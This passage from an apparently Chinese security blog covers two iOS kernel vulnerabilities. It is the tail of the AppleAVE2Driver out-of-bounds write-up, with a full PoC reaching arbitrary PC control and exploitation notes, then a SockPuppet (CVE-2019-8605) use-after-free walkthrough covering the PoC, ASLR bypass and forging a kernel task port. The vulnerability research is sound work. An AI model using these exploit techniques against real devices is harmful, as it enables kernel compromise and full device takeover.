userclient时，将调用一个名为AppleAVE2Driver::AVE_DestroyContext的函数，该函数位于该userclient关联的AVEClient对象上。AVE_DestroyContext在AVEClient中MEMORY_INFO结构上调用AppleAVE2Driver::DeleteMemoryInfo，并且在倒数第二步客户端的MEMORY_INFO结构数组上调用此函数，其数量由memoryInfoCnt{1,2}字段表示： 1234567891011121314151617181920212223242526v73 = currentClient-&gt;memoryInfoCnt1 + 2; if ( v73 &lt;= currentClient-&gt;memoryInfoCnt2 ) v73 = currentClient-&gt;memoryInfoCnt2; if ( v73 ) { iter1 = 0LL; statsMapBufArr = currentClient-&gt;statsMapBufferArray; do { AppleAVE2Driver::DeleteMemoryInfo(this, statsMapBufArr); ++iter1; loopMax = currentClient-&gt;memoryInfoCnt1 + 2; cnt2 = currentClient-&gt;memoryInfoCnt2; if ( loopMax &lt;= cnt2 ) loopMax = cnt2; else loopMax = loopMax; statsMapBufArr += 0x28LL; } while ( iter1 &lt; loopMax ); } 在_SetSessionSettings中，对memoryInfoCnt1的值进行边界检查： 12345if ( currentClient-&gt;memoryInfoCnt1 &gt;= 4u ){ ret = 0xE00002BCLL; return ret;} 但是，没有检查memoryInfoCnt2的值，这里缺少检查，加上while循环中的逻辑，意味着如果提供足够大的memoryInfoCnt2值，循环将越界访问和调用DeleteMemoryInfo上的数据： 1234567loopMax = currentClient-&gt;memoryInfoCnt1 + 2; // Take memoryInfoCnt1 (max 4), loopMax is &lt;=6cnt2 = currentClient-&gt;memoryInfoCnt2; // Take memoyInfoCnt2if ( loopMax &lt;= cnt2 ) // if cnt2 is larger than loopMax... loopMax = cnt2; // update loopMax to the value of memoryInfoCnt2else loopMax = loopMax; 默认情况下，statsMapBufferArray中有5个MEMORY_INFO结构。由于每个大小为0x28，数组将占用0xc8字节。由于这个数组是在AVEClient*对象中内联的，当我们触发越界错误时，下一个DeleteMemoryInfo调用将使用statsMapBufferArray之后所有的数据。在我的iPhone 8的12.4内核上，这个数组的偏移量是0x1b60，也就是说第6项(第一个越界项)位于偏移量0x1c28处。 现在，还记得在SetSessionSettings中，如何将大块数据从用户控制的缓冲区复制到AVEClient对象中吗？恰好其中一个受控制缓冲区位于statsMapBufferArray字段之后! 123456700000000 AVEClient struc ; (sizeof=0x29AC8, align=0x8, mappedto_215)[...]00001B60 statsMapBufferArray DCB 200 dup(?)00001C28 sessionSettings_block1 DCB ?[...]// Copies from the IOSurface buffer to a buffer adjacent to the statsMapBufferArraymemmove(&amp;currentClient-&gt;sessionSettings_block1, buffMgrKernAddr, 0x630LL); 因此，通过在复制到AVEClient的IOSurface缓冲区中提供精心构建的数据，我们完全可以控制越界数组条目。 控制PC现在，我们看一下AppleAVE2Driver::DeleteMemoryInfo函数原型，记住我们对memInfo对象具有完全控制权限： 123456789101112131415161718192021__int64 AppleAVE2Driver::DeleteMemoryInfo(AppleAVE2Driver *this, IOSurfaceBufferMngr **memInfo){ [...] if ( memInfo ) { if ( *memInfo ) { v8 = IOSurfaceBufferMngr::~IOSurfaceBufferMngr(*memInfo); operator delete(v8); } memset(memInfo, 0, 0x28uLL); result = 0LL; } else { result = 0xE00002BCLL; } return result;} IOSurfaceBufferMngr的析构函数直接封装了一个静态的IOSurfaceBufferMngr::RemoveBuffer调用: 12345IOSurfaceBufferMngr *IOSurfaceBufferMngr::~IOSurfaceBufferMngr(IOSurfaceBufferMngr *this){ IOSurfaceBufferMngr::RemoveBuffer(this); return this;} 然后RemoveBuffer调用IOSurfaceBufferMngr::CompleteFence，在本例中，汇编代码如下： 12345678910111213141516171819202122IOSurfaceBufferMngr::CompleteFence(IOSurfaceBufferMngr *this) STP X20, X19, [SP,#-0x10+var_10]! STP X29, X30, [SP,#0x10+var_s0] ADD X29, SP, #0x10 MOV X19, X0 // x19 = x0 (controlled pointer) LDR X0, [X0,#0x58] // Loads x0-&gt;0x58 CBZ X0, exit_stub // Exits if the value is zero LDRB W8, [X19,#0x1E] // Loads some byte at x19-&gt;0x1e CBNZ W8, exit_stub // Exits if the byte is non-zero MOV W1, #0 BL IOFence::complete LDR X0, [X19,#0x58] // Loads x19-&gt;0x58 LDR X8, [X0] // Loads x0-&gt;0x0 LDR X8, [X8,#0x28] // Loads function pointer x8-&gt;0x28 BLR X8 // Branches to fptr, giving arbitrary PC control STR XZR, [X19,#0x58]exit_stub LDP X29, X30, [SP,#0x10+var_s0] LDP X20, X19, [SP+0x10+var_10],#0x20 RET 本质上，通过创建一个userland共享缓冲区，可以触发一个越界访问，这将直接在关闭userclient时提供任意PC控制。 下面是这个漏洞的PoC，它将使设备崩溃，并导致取消对地址0x4141414142424242的引用: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485void kernel_bug_poc(io_connect_t ioconn, io_connect_t surface_ioconn){ kern_return_t ret; { char open_inputStruct[0x8] = { 0 }; char open_outputStruct[0x4] = { 0 }; size_t open_outputStruct_size = sizeof(open_outputStruct); // AppleAVE2UserClient::_my_open ret = IOConnectCallStructMethod(ioconn, 0, open_inputStruct, sizeof(open_inputStruct), open_outputStruct, &amp;open_outputStruct_size); NSLog(@&quot;my_open: %x %s&quot;, ret, mach_error_string(ret)); } // Create an IOSurface using the IOSurface client owned by MIDIServer // Address &amp; size of the shared mapping created by IOSurface and // returned in the output struct at offsets 0x0 and 0x1c respectively uint64_t surface_map_addr = 0x0; uint32_t surface_map_size = 0x0; uint32_t surface_id = IOSurfaceRootUserClient_CreateSurface(surface_ioconn, &amp;surface_map_addr, &amp;surface_map_size); NSLog(@&quot;Got Surface ID: %d&quot;, surface_id); uintptr_t surface_data = malloc(surface_map_size); bzero((void *)surface_data, surface_map_size); *(uint64_t *)(surface_data + 0x0) = 0x4141414142424242; // First pointer to memory containing function pointer // This field is the start of the block adjacent to the stats array *(uint32_t *)(surface_data + 0x3420) = 6; // `memoryInfoCnt2` field, gives 1 OOB access // Sends the data to MIDIServer to be written onto the IOSurface // The MIDIServer ROP chain hangs on the following call: // vm_read_overwrite(ourtask, clientbuf, surface1_map_size, surface1_map_addr, ...) send_overwriting_iosurface_map(surface_data, surface_map_size, surface_map_addr); // Waits for a message back from MIDIServer, sent by the ROP chain // Notifies us that the vm_read_overwrite call completed reply_notify_completion(); free(surface_data); { // Write the OOB count value to the `currentClient` object, and write our adjacent data char setSessionSettings_inputStruct[0x108] = { 0 }; char setSessionSettings_outputStruct[0x4] = { 0 }; size_t setSessionSettings_outputStruct_size = sizeof(setSessionSettings_outputStruct); *(uint32_t *)(setSessionSettings_inputStruct + 0x04) = surface_id; // FrameQueueSurfaceId *(uint32_t *)(setSessionSettings_inputStruct + 0x08) = surface_id; // InitInfoSurfaceId, vulnerable IOSurface mapping *(uint32_t *)(setSessionSettings_inputStruct + 0x0c) = surface_id; // ParameterSetsBuffer *(uint32_t *)(setSessionSettings_inputStruct + 0xd0) = surface_id; // codedHeaderCSID &amp; codedHeaderBuffer [0] *(uint32_t *)(setSessionSettings_inputStruct + 0xd4) = surface_id; // codedHeaderCSID &amp; codedHeaderBuffer [1] // AppleAVE2UserClient::_SetSessionSettings ret = IOConnectCallStructMethod(ioconn, 7, setSessionSettings_inputStruct, sizeof(setSessionSettings_inputStruct), setSessionSettings_outputStruct, &amp;setSessionSettings_outputStruct_size); NSLog(@&quot;SetSessionSettings: %x %s&quot;, ret, mach_error_string(ret)); } { // Trigger the bug char close_inputStruct[0x4] = { 0 }; char close_outputStruct[0x4] = { 0 }; size_t close_outputStruct_size = sizeof(close_outputStruct); // AppleAVE2UserClient::_my_close ret = IOConnectCallStructMethod(ioconn, 1, close_inputStruct, sizeof(close_inputStruct), close_outputStruct, &amp;close_outputStruct_size); NSLog(@&quot;my_close: %x %s&quot;, ret, mach_error_string(ret)); }} log： 12345678910panic(cpu 5 caller 0xfffffff007205df4): Kernel data abort. (saved state: 0xffffffe03cafaf40) x0: 0x4141414142424242 x1: 0xffffffe02cb09c28 x2: 0x0000000000000000 x3: 0xffffffe02cb09c28 x4: 0x0000000000000000 x5: 0x0000000000000000 x6: 0xfffffff00f35bb54 x7: 0x0000000000000000 x8: 0x0000000000000006 x9: 0x0000000000000006 x10: 0x0000000000000001 x11: 0x0000000000080022 x12: 0x0000000000000022 x13: 0xffffffe00094bc08 x14: 0x0000000000080023 x15: 0x0000000000006903 x16: 0xfffffff00ee71740 x17: 0x0000000000000000 x18: 0xfffffff00ee79000 x19: 0x4141414142424242 x20: 0xffffffe02cb08000 x21: 0x0000000000000000 x22: 0xffffffe02cb09c28 x23: 0x0000000000000005 x24: 0xffffffe02cb2f748 x25: 0xffffffe02cb0d034 x26: 0x0000000000000050 x27: 0xffffffe004929218 x28: 0x0000000000000000 fp: 0xffffffe03cafb2a0 lr: 0xfffffff0069397e8 sp: 0xffffffe03cafb290 pc: 0xfffffff0069398dc cpsr: 0x80400304 esr: 0x96000004 far: 0x414141414242429a 可以看到pc对齐是在x0-&gt;0x58指令之前的分支: 12345678910111213141516170xFFFFFFF0069398CC IOSurfaceBufferMngr::CompleteFence0xFFFFFFF0069398CC0xFFFFFFF0069398CC STP X20, X19, [SP,#-0x10+var_10]!0xFFFFFFF0069398D0 STP X29, X30, [SP,#0x10+var_s0]0xFFFFFFF0069398D4 ADD X29, SP, #0x100xFFFFFFF0069398D8 MOV X19, X00xFFFFFFF0069398DC LDR X0, [X0,#0x58] // Faults here 0xFFFFFFF0069398E0 CBZ X0, loc_FFFFFFF0069399080xFFFFFFF0069398E4 LDRB W8, [X19,#0x1E]0xFFFFFFF0069398E8 CBNZ W8, loc_FFFFFFF0069399080xFFFFFFF0069398EC MOV W1, #00xFFFFFFF0069398F0 BL IOFence__complete0xFFFFFFF0069398F4 LDR X0, [X19,#0x58]0xFFFFFFF0069398F8 LDR X8, [X0]0xFFFFFFF0069398FC LDR X8, [X8,#0x28]0xFFFFFFF006939900 BLR X8[...] Exploitation一旦逃逸了沙盒，利用这个漏洞就非常简单。 PoC中的代码也可用于EXP，但是SetSessionSettings缓冲区(0x4141414142424242)中提供的值必须指向可控的内核缓冲区，可以从该缓冲区加载函数指针。另外一个堆信息泄漏的漏洞可以用于稳定性保证。在kASLR失败的情况下，还可以根据每个设备推测堆的位置:在堆内存高地址测试下，大量的分配很可能会在相同的内存范围(0xffffffffe1xxxxxxxx)。 因为这个漏洞可以让我们控制PC，所以它可以通过ROP或JOP进行利用。虽然不一定适用于有PAC的A12或更新版本的设备，但非A12/A13是支持我们沙盒逃逸，还要注意，在构建ROP/JOP链时，可控内核缓冲区的地址在x19内，另一个可控指针在x0内，可以用作stack pivot或暂存内存空间。 反弹shell POC。 参考 https://www.anquanke.com/post/id/195619","link":"/2021/12/12/iOS-RCE-CVE-2019-8797-CVE-2019-8795-CVE-2019-8794/"},{"title":"iOS-SockPuppet漏洞利用","text":"前言漏洞编号为CVE-2019-8605，在iOS 12.3中进行了修复，但是在12.4又被利用了，随后在iOS 12.4.1中进行了修复。 原文链接：https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html 原理讲解视频：https://www.youtube.com/watch?v=YV3jewkUJ54 背景此问题最早在2013年受到XNU的影响，并于2019年3月报告给Apple。然后在2019年5月在iOS 12.3中进行了修补（参考链接：https://bugs.chromium.org/p/project-zero/issues/detail?id=1806 了完整的详细信息，包括iOS的漏洞分析，名为SockPuppet）。 2019年7月，然后发现此问题在iOS 12.4中也存在，后来在2019年8月下旬在iOS 12.4.1中进行了修补。 漏洞挖掘如何写一个 fuzz： 先收集目标以往的漏洞； 在源代码中，找到漏洞对应的位置； 选择某一组件，该组件包含多个已公开漏洞； 编写fuzz； fuzz该组件； 如果fuzz能够找到以前的漏洞，则它可能会发现新的漏洞； 当每次发现一个新的漏洞后，需要采取一定的措施，以防止再被命中。 https://lwn.net/Articles/677764/ https://github.com/google/fuzzer-test-suite/blob/master/tutorial/structure-aware-fuzzing.md 漏洞分析POC： 1234567891011121314151617181920212223242526272829#define IPPROTO_IP 0#define IN6_ADDR_ANY { 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 }#define IN6_ADDR_LOOPBACK { 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1 }int main() { int s = socket(AF_INET6, SOCK_RAW, IPPROTO_IP); struct sockaddr_in6 sa1 = { .sin6_len = sizeof(struct sockaddr_in6), .sin6_family = AF_INET6, .sin6_port = 65000, .sin6_flowinfo = 3, .sin6_addr = IN6_ADDR_LOOPBACK, .sin6_scope_id = 0, }; struct sockaddr_in6 sa2 = { .sin6_len = sizeof(struct sockaddr_in6), .sin6_family = AF_INET6, .sin6_port = 65001, .sin6_flowinfo = 3, .sin6_addr = IN6_ADDR_ANY, .sin6_scope_id = 0, }; connect(s, (const sockaddr*)&amp;sa1, sizeof(sa1)); unsigned char buffer[4] = {}; setsockopt(s, 41, 50, buffer, sizeof(buffer)); connect(s, (const sockaddr*)&amp;sa2, sizeof(sa2)); close(s);} 崩溃后的栈跟踪情况： 12345678910#0 0x497a3d in free _asan_rtl_:3#1 0x7f8bbe5f42cd in in6_pcbdetach /src/bsd/netinet6/in6_pcb.c:681:3#2 0x7f8bbe6b06d0 in rip6_detach /src/bsd/netinet6/raw_ip6.c:829:2#3 0x7f8bbe6af680 in rip6_abort /src/bsd/netinet6/raw_ip6.c:837:9#4 0x7f8bbe6b0795 in rip6_disconnect /src/bsd/netinet6/raw_ip6.c:848:9#5 0x7f8bbe10132f in sodisconnectlocked /src/bsd/kern/uipc_socket.c:1792:10#6 0x7f8bbe1028dc in soconnectlock /src/bsd/kern/uipc_socket.c:1664:15#7 0x7f8bbe133e00 in connectit /src/bsd/kern/uipc_syscalls.c:954:10#8 0x7f8bbe133b25 in connect_nocancel /src/bsd/kern/uipc_syscalls.c:726:10#9 0x7f8bbe6f22b4 in connect_wrapper /src/fuzzing/syscall_stubs.c:125:7 崩溃实际是发生在free函数上： 123456789101112131415161718192021voidin6_pcbdetach(struct inpcb *inp){ // ... if (!(so-&gt;so_flags &amp; SOF_PCBCLEARING)) { struct ip_moptions *imo; struct ip6_moptions *im6o; inp-&gt;inp_vflag = 0; if (inp-&gt;in6p_options != NULL) { m_freem(inp-&gt;in6p_options); inp-&gt;in6p_options = NULL; // &lt;- good } ip6_freepcbopts(inp-&gt;in6p_outputopts); // &lt;- bad, dangling pointer ROUTE_RELEASE(&amp;inp-&gt;in6p_route); // free IPv4 related resources in case of mapped addr if (inp-&gt;inp_options != NULL) { (void) m_free(inp-&gt;inp_options); inp-&gt;inp_options = NULL; // &lt;- good }// ... 问题出现在对ip6_freepcbopts的调用上，在这里，开发者原本的意图是：在某些情况下，通过释放每个指针后将其置为NULL来重用socket选项。但由于in6p_outputopts是由一个指向另一个结构的指针来表示的，所以它们是由辅助函数 ip6_freepcbopts释放的，该函数不知道inp的地址，所以不能清除&amp;inp-&gt;in6p_outputopts，这段代码忽略了这一点。 释放的缓冲区是由setsockopt创建的，意味着我们可以通过getsockopt和setsockopt来继续访问释放的缓冲区，分别代表着读取和写入原语。 漏洞利用漏洞原语在有PAC的iOS上，漏洞利用会更加麻烦一些，需要使用一个漏洞来获取内核读写，而代码执行需要别的利用方式。 一个进程在内核中表示两次：一个作为Mach任务，一个作为BSD proc。 包含悬空指针的inp6_outputopts的inpcb： 通过[get/set]sockopt查看这些选项的getter和setter，获取minmtu和prefer_tempaddr字段的整数是很直接的，可以让我们直接从释放的缓冲区中读取数据。如果我们能够回收in6po_pktinfo指针，我们可以自由读取20个字节。 ip6_getpcbopt实现片段： 1234567891011121314151617181920212223242526case IPV6_PKTINFO: if (pktopt &amp;&amp; pktopt-&gt;ip6po_pktinfo) optdata = (void *)pktopt-&gt;ip6po_pktinfo; else { /* XXX: we don't have to do this every time... */ bzero(&amp;null_pktinfo, sizeof (null_pktinfo)); optdata = (void *)&amp;null_pktinfo; } optdatalen = sizeof (struct in6_pktinfo); // 20 bytes break;case IPV6_USE_MIN_MTU: if (pktopt) optdata = (void *)&amp;pktopt-&gt;ip6po_minmtu; else optdata = (void *)&amp;defminmtu; optdatalen = sizeof (int); break;case IPV6_PREFER_TEMPADDR: if (pktopt) optdata = (void *)&amp;pktopt-&gt;ip6po_prefer_tempaddr; else optdata = (void *)&amp;defpreftemp; optdatalen = sizeof (int); break; ip6po_minmtu和ip6po_prefer_tempaddr在内存中相邻，且按照qword对齐，所以，如果能够使用其他包含指针的对象回收这块内存，就能够读出指针并绕过ASLR。还可以利用这些字段来进行堆喷，我们在in6po_pktinfo字段和mintmu字段中的magic重合的位置喷出包含我们选择的任意指针值的对象。这样我们就可以反复读出minmtu字段，所以如果看到我们的magic，我们就知道在in6po_pktinfo中取消引用指针是安全的。一般来说，读取inp6_outputopts是安全的，因为我们知道它已经被映射了，但是in6po_pktinfo就不安全了，因为它可能已经被其他垃圾回收了，指向未映射或不可读的内存。 不幸的是，setsockopt路径不像getsockopt路径那样容易使用。大多数相关的选项都是只针对root的，或者是高度受限的。这使得IPV6_2292PKTINFO/IPV6_PKTINFO仍然是最好的选项，但在测试和阅读代码时，除了高度约束的值之外，似乎无法在那里写任何东西。ipi6_addr字段，看起来很适合写任意数据，但必须设置为0，才能通过未指定的检查。而接口索引必须是有效的，这就约束了我们的低值。如果接口为0，就可以释放选项。这意味着我们只能在内存的任何地方写入16个空字节加上一个非零的4字节小整数。这对于开发来说当然足够了，但是释放的情况呢？只要你传入一个包含20个空字节的pktinfo结构，ip6_setpktopt就会帮你调用ip6_clearpktopts，最后调用free(pktopt-&gt;ip6po_pktinfo, M_IP6OPT)。记住，in6po_pktinfo是我们的受控指针，所以这意味着我们有一个任意的free。更妙的是，我们可以在不知道其区域的情况下释放任何对象。这是因为free是kfree_addr的封装器，它代表你查找zone。为了保持后期开发的通用性，我选择了任意free原语，而不是约束的写原语。 堆喷利用IOSurface进行堆喷。 tfp0这是task_for_pid的缩写，它会向你返回一个Mach端口，并带有给定pid的任务的发送权。当使用pid=0来调用它时，将返回一个内核任务端口。 端口类似一个描述消息队列的文件描述符，内核中每个此类消息队列都有一个接收者，和一个或多个发送者。对于一个给定的端口名，可以根据访问该队列的权限来向该队列发送或接收Mach消息。 如果我们具有任务端口的发送权，就可以利用mach_vm_allocate，mach_vm_deallocate，mach_vm_protect和mach_vm_read_overwrite之类的函数，来读取、写入和分配内存。 为了更好地模拟tfp0调用，先看一个消息传递的例子，消息头结构： 12345678typedef struct { mach_msg_bits_t msgh_bits; // &quot;disposition&quot;, e.g. MACH_MSG_TYPE_COPY_SEND mach_msg_size_t msgh_size; mach_port_t msgh_remote_port; // destination port name mach_port_t msgh_local_port; mach_port_name_t msgh_voucher_port; mach_msg_id_t msgh_id;} mach_msg_header_t; 上面有两个重要的字段，msgh_remote_port 包含目标端口名称，如果我们可以访问它，它将是内核任务端口的名称；msgh_bits指定了多个标志，其中之一是对我们发送的不同端口名称的消息的属性。 当我们想从用户区发送消息时，我们需要一个mach陷阱，它相当于系统调用，称为mach_msg_overwrite_trap，MACH_SEND_MSG： 12345678910111213141516mach_msg_return_t mach_msg_overwrite_trap( struct mach_msg_overwrite_trap_args* args) { // ... mach_msg_return_t mr = MACH_MSG_SUCCESS; vm_map_t map = current_map(); if (option &amp; MACH_SEND_MSG) { ipc_space_t space = current_space(); ipc_kmsg_t kmsg; mr = ipc_kmsg_get(msg_addr, send_size, &amp;kmsg); // ... mr = ipc_kmsg_copyin(kmsg, space, map, override, &amp;option); // ... mr = ipc_kmsg_send(kmsg, option, msg_timeout);// ... 如果要把消息传递到内核任务端口，需要了解ipc_kmsg_get，ipc_kmsg_copyin和ipc_kmsg_send的工作方式。ipc_kmsg_get将消息从调用任务的地址空间复制到内核中；ipc_kmsg_copyin通过调用ipc_kmsg_copyin_header获取消息头： 12345678910111213141516171819202122232425262728293031323334353637mach_msg_return_t ipc_kmsg_copyin_header(ipc_kmsg_t kmsg, ipc_space_t space, mach_msg_priority_t override, mach_msg_option_t *optionp) { mach_msg_header_t *msg = kmsg-&gt;ikm_header; mach_msg_bits_t mbits = msg-&gt;msgh_bits &amp; MACH_MSGH_BITS_USER; mach_port_name_t dest_name = CAST_MACH_PORT_TO_NAME(msg-&gt;msgh_remote_port); mach_port_name_t reply_name = CAST_MACH_PORT_TO_NAME(msg-&gt;msgh_local_port); mach_msg_type_name_t dest_type = MACH_MSGH_BITS_REMOTE(mbits); ipc_object_t dest_port = IO_NULL; ipc_port_t dest_soright = IP_NULL; ipc_entry_t dest_entry = IE_NULL; if (dest_name != reply_name) { // nedwill: this converts name to ipc_entry_t dest_entry = ipc_entry_lookup(space, dest_name); if (dest_entry == IE_NULL) { goto invalid_dest; } // nedwill: this converts ipc_entry_t to ipc_port_t (and checks capability) kr = ipc_right_copyin(space, dest_name, dest_entry, dest_type, FALSE, &amp;dest_port, &amp;dest_soright, &amp;release_port, &amp;assertcnt); if (kr != KERN_SUCCESS) { goto invalid_dest; } // ... } // ... msg-&gt;msgh_bits = MACH_MSGH_BITS_SET(dest_type, reply_type, voucher_type, mbits); msg-&gt;msgh_remote_port = (ipc_port_t)dest_port; // ...} ipc_kmsg_copyin_header用于将远程端口名称转换为端口对象，更新msg-&gt; msgh_remote_port指向实际对象，而不是存储特定于任务的名称。消息头有几个名称字段，我们希望kernel_task端口是我们的目标端口。ipc_space_t space参数表示当前正在运行的任务的IPC空间，相当于文件描述符表。首先，我们在IPC空间中查找dest_name，得到代表它的ipc_entry_t。每个ipc_entry_t都有一个叫做ie_bits的字段，它包含了我们的任务与相关端口交互的权限。下面是IPC入口结构的样子： 123456struct ipc_entry { struct ipc_object *ie_object; // pointer to the ipc_port_t ipc_entry_bits_t ie_bits; // our rights (receive/send/send-once/etc.) mach_port_index_t ie_index;...}; 我们发送的消息头有一个disposition的目的地，它描述了我们希望我们的消息用远程端口名的能力做什么。这里是实际验证和使用的地方： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546kern_return_t ipc_right_copyin(ipc_space_t space, mach_port_name_t name, ipc_entry_t entry, mach_msg_type_name_t msgt_name, boolean_t deadok, ipc_object_t *objectp, ipc_port_t *sorightp, ipc_port_t *releasep, int *assertcntp) { ipc_entry_bits_t bits; ipc_port_t port; *releasep = IP_NULL; *assertcntp = 0; bits = entry-&gt;ie_bits; switch (msgt_name) { case MACH_MSG_TYPE_COPY_SEND: { if (bits &amp; MACH_PORT_TYPE_DEAD_NAME) goto copy_dead; /* allow for dead send-once rights */ if ((bits &amp; MACH_PORT_TYPE_SEND_RIGHTS) == 0) goto invalid_right; port = (ipc_port_t)entry-&gt;ie_object; if ((bits &amp; MACH_PORT_TYPE_SEND) == 0) { assert(IE_BITS_TYPE(bits) == MACH_PORT_TYPE_SEND_ONCE); assert(port-&gt;ip_sorights &gt; 0); ip_unlock(port); goto invalid_right; } port-&gt;ip_srights++; ip_reference(port); ip_unlock(port); *objectp = (ipc_object_t)port; *sorightp = IP_NULL; break; } default: invalid_right: return KERN_INVALID_RIGHT; } return KERN_SUCCESS;} IPC条目中的ie_bits是用来检查我们的权限的。如果我们想利用这条消息中的发送权限，我们可以将权限复制到消息中，这段代码在更新相关的引用计数之前，先检查我们在ie_bits中是否有权限，最后让我们访问可以enqueue消息的端口对象。如果我们没有根据entry-&gt;ie_bits的权限，那么发送消息的尝试就会失败。 现在我们的消息已经被复制、验证并更新为包含真正的内核对象指针，ipc_kmsg_send继续前进并将我们的消息添加到目标队列中。 123456789101112131415161718192021222324252627282930313233343536mach_msg_return_t ipc_kmsg_send(ipc_kmsg_t kmsg, mach_msg_option_t option, mach_msg_timeout_t send_timeout) { ipc_port_t port; thread_t th = current_thread(); mach_msg_return_t error = MACH_MSG_SUCCESS; boolean_t kernel_reply = FALSE; port = (ipc_port_t)kmsg-&gt;ikm_header-&gt;msgh_remote_port; assert(IP_VALID(port)); ip_lock(port); if (port-&gt;ip_receiver == ipc_space_kernel) { port-&gt;ip_messages.imq_seqno++; ip_unlock(port); kmsg = ipc_kobject_server(kmsg, option); if (kmsg == IKM_NULL) return MACH_MSG_SUCCESS; /* restart the KMSG_INFO tracing for the reply message */ port = (ipc_port_t)kmsg-&gt;ikm_header-&gt;msgh_remote_port; assert(IP_VALID(port)); ip_lock(port); /* fall thru with reply - same options */ kernel_reply = TRUE; if (!ip_active(port)) error = MACH_SEND_INVALID_DEST; } if (error != MACH_MSG_SUCCESS) { ip_unlock(port); } else { // ... error = ipc_mqueue_send(&amp;port-&gt;ip_messages, kmsg, option, send_timeout); } // ... return error;} 从上面可以看出，如果目的端口的ip_receiver是内核IPC空间，ipc_kobject_server作为特例被调用来处理内核消息。内核任务端口的ip_receiver是内核IPC空间，所以我们在安排tfp0的时候一定要复制。 我们要在IPC空间中添加一个IPC条目，ie_object指向内核任务端口，ie_bits表示我们有一个发送权。下面是它的样子： 绕过ASLR并伪造数据结构IPC系统一般都需要一种方法来序列化文件描述符，并通过管道发送，内核需要理解这种约定来进行适当的核算。Mach也不例外。Mach端口和文件描述符一样，可以由一个进程向另一个进程发送，并附加发送权限。你可以使用一个包含mach_msg_ool_descriptor_t的特殊消息，从一个进程向另一个进程发送一个行外端口。如果你想在一个消息中发送多个端口，你可以发送 mach_msg_ool_ports_descriptor_t，这是一个存储在行外（OOL）的端口数组，意思是在消息头本身之外。 我们和其他许多人一样，将在我们的开发中使用OOL端口描述符。 OOL端口数组之所以如此有用，是因为你可以完全控制数组的大小。当你传入一个由mach端口名组成的数组时，内核将为任意数量的指针分配空间，每一个指针都充满了指向我们要发送的ipc_port结构的指针。如果你没有注意到，我们可以使用这个技巧作为ASLR的旁路，因为我们可以将一个端口指针的OOL描述符数组与释放的大小为192的缓冲区重叠，然后简单地通过getockopt从释放的结构中读取两个相邻的int字段。这时我们就可以开始用我们的任意读取遍历内核数据结构了。 很多利用都会把一个bug变成一个读原语。我们有一个罕见的特权，那就是在进行任何破坏之前就有一个可靠的读原语，所以我们利用这一点结合这个指针披露来泄露所有相关的指针来完成利用，包括在一个已知地址上设置手工数据。我们现在就去做所有必要的遍历，你可以在下面看到。 上面绿色的节点代表我们探索的种子值，橙色的节点代表我们要找的值。通过在消息中喷出一个包含指向代表我们主机端口的ipc_port结构的指针的OOL端口描述符数组，我们找到它的ipc_port，它将通过接收器字段给我们提供ipc_space_kernel。 我们重复同样的初始技巧，为我们自己的任务找到ipc_port。从那里我们找到我们的任务的文件描述符表，然后用它来找到一个用于socket选项和管道缓冲区的vtable。vtable将给我们提供进入内核缓存二进制的指针。因为内核进程的BSD表示kernproc是在bsd/kern/bsd_init.c中全局分配的，所以我们可以使用socketops表中的已知偏移量来找到它，并查找kernel_task的地址。 管道缓冲区是通过调用pipe()系统调用创建的，它分配了一个缓冲区，我们可以通过文件描述符来写入和读取，这是一个众所周知的技巧，用于在已知地址下获取已知数据。为了制作我们将注入IPC空间的假ipc_port，我们创建一个管道，并向它发送数据。管道将排队的数据存储到内核堆上的一个缓冲区，通过通用的基于大小的区域分配。我们可以通过对相关管道文件描述符的读写，从用户空间反复读写该缓冲区，而这些数据则存储在内核内存中。通过知道我们管道的缓冲区地址，我们就可以在那里存储受控数据，并为其创建指针。我们将需要这些来为内核任务制作一个制作的ipc_port。 所以我们现在可以创建一个假的ipc_port并把它指向kernel_task和ipc_space_kernel， 对吗？我现在应该指出，即使我们可以调用task_for_pid(0)并获得一个kernel_task端口，我们也不能向它发送消息。当内核将一个任务的 ipc_port转化为任务结构时，任何试图向kernel_task发送消息的用户区任务都会被阻止。这在task_conversion_eval中实现。 1234567891011121314151617181920212223kern_return_ttask_conversion_eval(task_t caller, task_t victim){ /* * Tasks are allowed to resolve their own task ports, and the kernel is * allowed to resolve anyone's task port. */ if (caller == kernel_task) { return KERN_SUCCESS; } if (caller == victim) { return KERN_SUCCESS; } /* * Only the kernel can can resolve the kernel's task port. We've established * by this point that the caller is not kernel_task. */ if (victim == TASK_NULL || victim == kernel_task) { return KERN_INVALID_SECURITY; }// ... 我使用了很多人使用过的技巧，简单地创建了一个kernel_task对象的副本，这样他们使用的指针比较就不会检测到我在向假的kernel_task对象发送消息。它不是真正的kernel_task并不重要，因为用一个假的kernel_task来支持mach_vm_*函数是很简单的，我们只需要复制内核的kernel_map和初始化一些其他的字段。在上图中你可以看到，我们可以简单地从kernel_task中提取，我们已经知道它的地址。我们将在管道缓冲区中存储与假ipc_port相邻的假内核任务。 注入kernel_task端口我们现在要使用OOL端口描述符数组做另一个用途。我们向自己发送一条消息，其中包含一个OOL数组，该数组包含我们的任务端口名称的副本，我们有发送权。发送权的验证最初发生在消息被发送的时候，所以如果我们在等待发送的时候编辑数组，我们可以覆盖其中一个ipc_ports，指向我们的假的kernel_task ipc_port。这个技巧改编自Stefan Esser关于这个主题的出色演讲，并且已经被用于一些漏洞的利用。请注意，ipc_port本身并没有发送或接收权限的概念；这些权限是作为ipc_entry的一部分被跟踪的，并且在ipc_port之外被处理。这是有道理的，因为一个端口封装了一个给定的消息队列。向该队列发送或接收的权限是每个进程所特有的，因此我们可以看到为什么这些信息会独立地存储在每个进程的表中。 尽管这种在OOL端口描述符数组中覆盖指针的技巧是一种已知的利用技术，但如何真正使这种破坏发生，要由利用开发者来想办法。我们有一个任意读取和任意释放。OOL端口描述符数组和管道缓冲区是在全局区外分配的。前面我们记下了管道缓冲区的地址。所以我们只需要释放管道缓冲区的实际缓冲区地址，并喷涂OOL端口描述符数组。然后我们读取管道缓冲区寻找我们任务的ipc_port，用我们的假端口指针覆盖它。然后我们将消息传递给自己，并检查我们是否成功注入了假的内核任务端口。 